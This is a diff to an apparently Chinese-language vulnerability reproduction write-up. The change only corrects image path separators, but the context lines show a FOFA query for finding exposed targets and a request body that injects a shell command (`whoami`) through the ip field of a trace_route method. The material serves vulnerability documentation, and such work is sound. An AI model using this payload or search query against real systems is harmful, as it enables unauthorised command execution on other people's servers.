@@ -8,7 +8,7 @@
 + fofa`header="iam" && server="Apache-Coyote/"`
 + 特征
 
-![image-20241027110055964](assets\image-20241027110055964.png)
+![image-20241027110055964](assets/image-20241027110055964.png)
 
 # 四、漏洞复现
 ```plain
@@ -26,5 +26,5 @@ Content-Length: 67
 method=trace_route&w=1&ip=127.0.0.1|echo%20`whoami`%3b&m=10
 ```
 
-![image-20241027110112047](assets\image-20241027110112047.png)
+![image-20241027110112047](assets/image-20241027110112047.png)
 
